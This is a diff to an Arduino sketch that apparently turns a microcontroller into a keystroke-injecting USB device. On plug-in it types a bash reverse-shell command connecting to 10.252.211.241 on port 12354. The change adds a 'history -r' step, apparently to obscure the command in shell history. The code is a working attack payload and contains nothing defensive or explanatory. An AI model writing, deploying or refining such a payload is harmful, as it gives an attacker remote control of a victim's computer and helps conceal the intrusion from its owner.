@@ -27,7 +27,7 @@ void setup() {
   Keyboard.println(" bash");
   Keyboard.println("");
   delay(200);
-  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1");
+  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1 && history -r");
   Keyboard.press(KEY_LEFT_CTRL);
   delay(200);
   Keyboard.press(' ');
@@ -35,7 +35,7 @@ void setup() {
   Keyboard.release(KEY_LEFT_CTRL);
   delay(200);
   Keyboard.release(' ');
-  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1");
+  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1 && history -r");
   delay(200);
   Keyboard.println();
   Keyboard.press(KEY_LEFT_GUI);//win键
